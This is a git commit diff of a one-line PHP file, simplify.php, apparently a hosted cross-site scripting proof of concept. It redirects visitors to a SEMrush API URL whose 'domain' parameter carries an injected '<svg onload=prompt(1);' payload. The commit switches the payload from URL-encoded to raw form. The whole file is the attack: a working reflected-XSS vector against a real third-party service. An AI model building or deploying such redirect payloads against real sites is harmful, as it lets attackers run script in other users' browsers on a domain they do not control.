727a2102835150eb63dfa576d448ded6f84544b0
missoum1307 <missoum1307@users.noreply.github.com>
2018-03-25 00:27:58 +0100

    Update simplify.php

--- simplify.php
+++ simplify.php
@@ -1,4 +1,4 @@
-<?php header('location: https://us.api.semrush.com/?action=report&type=domain_rank&domain=i<svg%20onload=prompt(1);%2f%2f.wordpress.com
+<?php header('location: https://us.api.semrush.com/?action=report&type=domain_rank&domain=i<svg onload=prompt(1);.wordpress.com
 ')?>
 
 
